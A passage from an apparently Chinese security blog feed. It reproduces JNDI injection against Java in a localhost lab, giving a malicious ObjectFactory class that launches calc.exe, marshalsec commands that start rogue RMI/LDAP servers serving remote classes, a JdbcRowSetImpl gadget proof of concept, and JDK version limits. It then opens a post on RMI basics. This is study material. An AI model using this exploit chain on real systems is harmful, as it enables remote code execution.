class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//尝试从本地获取该class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不在本地classpath，从cosebase中获取class</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从我们放置恶意class文件的web服务器中获取class文件</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化我们的恶意class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>实例化会默认调用构造方法、静态代码块。<br>上面的例子就是调用了构造方法完成任意代码执行。</p><p>但是可以注意到之前执行任意命令成功，但是报错退出了，我们修改我们的恶意class文件，换一个命令执行点<code>factory.getObjectInstance</code>复写该函数执行命令。</p><ol><li>报错是因为我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。只需要我们的类继承该类即可。</li><li>根据ObjectFactory.java的getObjectInstance接口复写函数<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure></li></ol><p>最终第二版ExecTest如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897awcgtkj31iy0x5wmt.jpg" alt="计算机成功.png"></p><blockquote><p>此外，1.8编译的ExecTest.java在1.7受害者环境中是不能运行的。反而1.7编译的ExecTest.java在1.8受害者环境中可以运行。<br>看来。。使用低版本的还好一点</p></blockquote><h2 id="使用工具起rmi-ldap服务"><a href="#使用工具起rmi-ldap服务" class="headerlink" title="使用工具起rmi ldap服务"></a>使用工具起rmi ldap服务</h2><p>以上我们就成功复现了JNDI注入，但是在常规使用中我们自己起rmi服务器太麻烦了。<br>我们使用<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec反序列化工具</a>起rmi、ldap服务</p><p>装有java8，使用<code>mvn clean package -DskipTests</code>编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject </span></span><br><span class="line"><span class="comment">#不加8088端口号 默认是1099</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/<span class="comment">#ExportObject 8088</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rmi服务器，rmi服务起在8088 恶意class在http://ip:8080/文件夹/#ExportObject </span></span><br><span class="line"><span class="comment">#不加8088端口号 默认是1389</span></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/文件夹/<span class="comment">#ExportObject 8088</span></span><br></pre></td></tr></table></figure><p>同时恶意class文件的web服务还需要自己去起。</p><h2 id="com-sun-rowset-JdbcRowSetImpl-利用链"><a href="#com-sun-rowset-JdbcRowSetImpl-利用链" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl 利用链"></a>com.sun.rowset.JdbcRowSetImpl 利用链</h2><p>在回到我们之前的攻击目标服务端（也就是rmi服务客户端）</p><p>目前我们利用jndi注入需要满足2个条件：<br>我们需要服务端存在以下代码，uri可控<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(uri);</span><br></pre></td></tr></table></figure></p><p>并且存在漏洞版本的java环境（目前我们知道1.8u191是不可以的）</p><p>我们先来扩展第一个代码限制的问题，就有点像在commons-collection反序列化一文寻找readobject复写点一样。<br>总是有很多机缘巧合。</p><p><strong>com.sun.rowset.JdbcRowSetImpl</strong>类：是在fastjson反序列化漏洞中触发jndi注入的一环，此处也算是一个引子，之后将详细分析fastjson反序列化的原因。</p><p><code>JdbcRowSetImpl.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();<span class="comment">//进入此处</span></span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>JdbcRowSetImpl.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;<span class="comment">//我们需要一个我们可控的getDataSourceName</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//下面两句是完美的漏洞触发代码</span></span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());<span class="comment">//可控的jndi注入点</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>最后需要<strong>this.getDataSourceName()</strong>的赋值处：<br><code>JdbcRowSetImpl.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="comment">//var1可控</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">            String var2 = <span class="keyword">this</span>.getDataSourceName();</span><br><span class="line">            <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">            <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.propertyChangeSupport.firePropertyChange(<span class="string">"dataSourceName"</span>, var2, var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.setDataSourceName(var1);<span class="comment">//赋值setDataSourceName</span></span><br><span class="line">        <span class="keyword">this</span>.propertyChangeSupport.firePropertyChange(<span class="string">"dataSourceName"</span>, (Object)<span class="keyword">null</span>, var1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>所以客户端的POC如下（即受害者执行以下代码就可以触发漏洞）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用工具来起rmi服务端</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8090/#ExecTest</code></p><p>然后用python起ExecTest.class的web（此处用的是上文的第二种payload）</p><p><code>py -3 -m http.server 8090</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897bvch2cj326b185e0e.jpg" alt="JdbcRowSetImpl.png"></p><p>至于该如何让JdbcRowSetImpl_inc执行在受害者机器上，那就是反序列化利用链一样地衍生了，这边只是衍生出第一步说明，JNDI注入并不是一定要存在一个web服务对外，一定要有一个<code>ctx.lookup(uri)</code>的url参数可控，才能形成漏洞。</p><p>漏洞利用要考虑java环境、组件，不要跟SQL注入一样认为都是定死的。具体就结合fastjson再议了。</p><h2 id="RMI-LDAP注入java版本限制"><a href="#RMI-LDAP注入java版本限制" class="headerlink" title="RMI+LDAP注入java版本限制"></a>RMI+LDAP注入java版本限制</h2><p>我们再回到第二个版本限制问题：</p><p>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。</p><p>所以不受RMI动态加载恶意类的 <strong>java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性</strong>的限制。具有更多的利用空间</p><p>但是我们之前实验还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。（这也是我们之前1.8u191失败的原因）</p><p>之前也提到jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取</p><p>LDAP服务的Reference远程加载Factory类<strong>不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制</strong>，所以适用范围更广。</p><p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，<br>在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <strong>com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false</strong>。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg" alt="java封杀.png"></p><p>至于1.8u191之后咋办，我们新起一篇来讲述把；还是先来看一下可以绕过更多版本限制的LDAP+JNDI注入的利用方式</p><h2 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP+JNDI"></a>LDAP+JNDI</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实也就是一个数据库，可以把它与mysql对比！<br>具有以下特点：</p><ol><li>基于TCP/IP协议</li><li>同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作</li><li>相对于mysql的表型存储；不同的是LDAP使用<strong>树型</strong>存储<ol><li>因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能。</li></ol></li></ol><p>树层次分为以下几层：</p><ul><li>dn：一条记录的详细位置，由以下几种属性组成</li><li>dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）</li><li>ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）</li><li>cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）</li></ul><p>举个例子一条记录就是<br>dn=”uid=songtao.xu,ou=oa,dc=example,dc=com”</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可。</p><p>我们重点关注版本问题，我们在1.8u161版本(RMI+JNDI不行、LDAP+JNDI可以的版本)下去使用ldap+jndi注入</p><p>POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"ldap://127.0.0.1:1389/aa"</span>;</span><br><span class="line"><span class="comment">//        String uri = "rmi://127.0.0.1:1099/aa";</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务端一样用工具起来，不赘述。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897c3ew1cj31bq10pqhr.jpg" alt="1.8u161-ldap.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g897cf4q73j31yi0vp430.jpg" alt="1.8u161-rmi.png"></p><p>结果没毛病</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>分析一通，小结就是以后渗透测试要用ldap-JNDI注入，命中率更高。</p><p>另外如果只有rmi流量和ldap流量，但是没有http请求，说明对方jdk版本过高导致攻击失败。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/115849.html</a><br><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a><br><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>RPC<br><a href="https://www.jianshu.com/p/2accc2840a1b" target="_blank" rel="noopener">https://www.jianshu.com/p/2accc2840a1b</a><br><a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">https://www.freebuf.com/column/189835.html</a><br>ldap<br><a href="https://www.cnblogs.com/wilburxu/p/9174353.html" target="_blank" rel="noopener">https://www.cnblogs.com/wilburxu/p/9174353.html</a><br><a href="https://www.jianshu.com/p/7e4d99f6baaf" target="_blank" rel="noopener">https://www.jianshu.com/p/7e4d99f6baaf</a><br><a href="https://blog.csdn.net/caoyujiao520/article/details/82762097" target="_blank" rel="noopener">https://blog.csdn.net/caoyujiao520/article/details/82762097</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇讲述了RMI-JNDI注入的利用原理，分析了利用流程；&lt;br&gt;使用了marshalsec反序列化工具去简单的起一个RMI/LDAP服务端
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>RMI-反序列化</title>
    <link href="http://lalajun.com/2019/10/15/RMI-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://lalajun.com/2019/10/15/RMI-反序列化/</id>
    <published>2019-10-15T02:05:28.000Z</published>
    <updated>2020-03-10T07:06:54.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在复现fastjson的过程中看到rmi、LDAP等机制的使用，但一直模模糊糊搞不懂，想来搞清楚这些东西。</p><p>但是发现RMI在fastjson中的利用，只是JNDI注入的其中一种利用手段；与RMI本身的反序列化并不是很有关系。</p><p>原本想在一篇中整理清楚，由于JNDI注入知识点太过杂糅，将新起一篇说明。</p><p>此篇，我们以RMI服务入手，从基础使用开始再到反序列化利用。</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation），远程方法调用。跟RPC差不多，是java独立实现的一种机制。实际上就是在一个java虚拟机上调用另一个java虚拟机的对象上的方法。</p><p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。（我们可以再之后数据包中看到该协议特征）</p><p>在RMI中对象是通过序列化方式进行编码传输的。（我们将在之后证实）</p><p>RMI分为三个主体部分：</p><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。</li></ul><p>总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样。</p><p>唯一区别就是RMI服务端提供的方法，被调用的时候该方法是<strong>执行在服务端</strong>。</p><blockquote><p>这一点一开始搞不清楚，在攻击利用中糊涂的话会很难受，被调用的方法实际上是在RMI服务端执行。<br>之前认为这一点跟fastjson利用RMI攻击相冲突，因为fastjson的payload是写在攻击者RMI服务器中，但是在实际上是在客户端执行。于RMI反序列化利用完全相反<br>但实际上这两种利用方式发生在完全不同的流程中。我们保持疑问先放一放，将在接下来解答。</p></blockquote><h3 id="RMI远程对象部署-调用流程"><a href="#RMI远程对象部署-调用流程" class="headerlink" title="RMI远程对象部署-调用流程"></a>RMI远程对象部署-调用流程</h3><p>要利用先使用。</p><p>Server部署：</p><ol><li>Server向Registry注册远程对象，远程对象绑定在一个<code>//hostL:port/objectname</code>上，形成一个映射表（Service-Stub）。</li></ol><p>Client调用：</p><ol><li>Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。</li><li>Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器</li><li>Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</li></ol><h3 id="RMI服务端与客户端实现"><a href="#RMI服务端与客户端实现" class="headerlink" title="RMI服务端与客户端实现"></a>RMI服务端与客户端实现</h3><ol><li>服务端编写一个远程接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个接口需要</p><ul><li>使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）</li><li>同时需要继承Remote接口</li><li>接口的方法需要生命java.rmi.RemoteException报错</li></ul><ol start="2"><li>服务端实现这个远程接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"构造函数中"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String a)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call from"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个实现类需要</p><ul><li>实现远程接口</li><li>继承UnicastRemoteObject类，貌似继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上。<br>（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。）</li><li>构造函数需要抛出一个RemoteException错误</li><li>实现类中使用的对象必须都可序列化，即都继承java.io.Serializable</li></ul><ol start="3"><li>注册远程对象</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//远程接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//远程接口的实现</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span 